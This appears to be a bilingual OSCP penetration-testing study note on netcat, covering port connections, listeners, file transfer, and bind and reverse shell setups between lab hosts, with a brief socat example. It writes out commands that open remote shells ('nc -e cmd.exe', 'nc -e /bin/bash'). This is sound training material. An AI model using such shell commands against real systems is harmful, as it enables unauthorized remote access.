---
title: 'OSCP Note_ PRACTICAL TOOLS'
disqus: hackmd
---

OSCP Note_ PRACTICAL TOOLS
===

# PRACTICAL TOOLS
We often find ourselves in situations where the only tools available are those already installed on the target machine.

## Netcat
Netcat is one of the original penetration testing tools. Netcat reads and writes data across network connections using TCP or UDP protocols.

### – Connecting To a TCP/UDP Port
```
nc -n -v {Destination IP} {Destination port}
```
>-n： skip DNS name resolution\
>-v：詳細模式（verbose）輸出，顯示詳細的連接過程和調試訊息。

```
┌──(frankchang㉿CHW-Macbook)-[~]
└─$ nc -n -v 10.11.0.22 110
(UNKNOWN) [10.11.0.22] 110 (pop3) open
+OK POP3 server ready
```
> （110 port 通常用於 POP3 電子郵件協議）\
> 上面回應表示 Netcat 成功連接到目標 IP 地址 10.11.0.22 的 110 端口，並顯示了 POP3 服務器的歡迎訊息

**Try to interact with the server by attempting to authenticate as the Offsec user**

![image](https://hackmd.io/_uploads/rkfkLqLIR.png)

### – Listening On a TCP/UDP Port

```
rdesktop {Windows IP} -u {Windows User} -p {Windows password} -g 1024x768 -x 0x80
```
> -g 1024x768: RDP解析度為 1024x768 像素\
> -x 0x80: 指定RDP的體驗設置，0x80 代表低頻寬連接，會禁用一些高頻寬需求的功能以提高連接效率。

![image](https://hackmd.io/_uploads/r1IZJiU8R.png)

#### (In Windows RDP)
![image](https://hackmd.io/_uploads/r1cmmj8UR.png)
> 在 Windows 遠端桌面開4444 port
```
nc -nvlp {port}
```
>-n： skip DNS name resolution\
>-v：詳細模式（verbose）輸出，顯示詳細的連接過程和調試訊息\
>-l：進入「監聽」模式，等待傳入的連接\
> -p 4444：指定 Netcat 監聽的local port 為 4444

#### 1. Kali terminal send request
![image](https://hackmd.io/_uploads/ByPF4iIUR.png)
#### 2. Windows RDP
![image](https://hackmd.io/_uploads/HJda4iULA.png)

>[!Note]
> It's a important feature in netcat

### – Transferring Files with Netcat
Netcat can also be used to transfer files both text and binary.
#### (In Windows RDP)
```
nc -nvlp {port} > {exe name}.exe    #監聽
```
![image](https://hackmd.io/_uploads/BkFRFjLU0.png)

#### (In Kali terminal)
```
nc -nv {port} < {Transferred File's path}    #傳送檔案
```
![image](https://hackmd.io/_uploads/SkhLqs8U0.png)

#### (Back to Windows)
> Give the file enough time to transfer
```
{exe name}.exe -V
```
![image](https://hackmd.io/_uploads/rkviooUUC.png)
> change to **wget.exe** from Kali

### – Remote Administration with Netcat
```
man nc
```
#### (1) Netcat Bind Shell Scenario
![image](https://hackmd.io/_uploads/SJZeM3UUR.png)
![image](https://hackmd.io/_uploads/H1kbG28IA.png)
> Bob is running Windows\
> And Alice is running is running Linux.

![image](https://hackmd.io/_uploads/B1CQl6LIC.png)
> Bob needs his system and asked Alice to connect to his computer and issue some commands remotely.

##### (Bob: Windows)
IP: 10.11.0.22
```
nc -nvlp 4444 -e cmd.exe
```
> -e cmd.exe: 在連接建立後，執行 cmd.exe，這是 Windows 的命令行解釋

![image](https://hackmd.io/_uploads/HkXT76I8C.png)

##### (Alice: Kali)
```
nc -nv 10.11.0.22 4444
```
![image](https://hackmd.io/_uploads/r1FBE6UIA.png)
> 成功執行 Bob 的 cmd.exe (Kali 遠端執行 Windows 指令)

![image](https://hackmd.io/_uploads/SJ8K4aUU0.png)
> ipconfig 顯示 Bob 的IP

#### (2) Reverse Shell Scenario
Alice needs help from Bob.
![image](https://hackmd.io/_uploads/rk2BqA8LA.png)
> Alice 在內網\
> We can send control of Alice's command prompt to Bob.\
> (Reverse Shell)
##### (Bob: Windows) > Listen
IP: 10.11.0.22
```
nc -nvlp 4444 
```
![image](https://hackmd.io/_uploads/Hy1oj0LUA.png)
> Listen port 4444 for incoming shell

##### (Alice: Kali) > Send
Send reverse shell to Bob
```
nc -nv {Destination IP} {Destination port} -e /bin/bash
```
![image](https://hackmd.io/_uploads/HyUHn0UIR.png)
> -e /bin/bash: 在連接建立後，執行 /bin/bash，這是 Linux 的命令行解釋

##### Back to (Bob: Windows)
![image](https://hackmd.io/_uploads/rkfz6CL8C.png)
> 成功在 Windows 上遠端執行 Kali command

## Socat
Socat is a command-line utility that establishes bidirectional byte streams and transfers data between them.
```
socat - TCP4:10.11.0.22:110
```
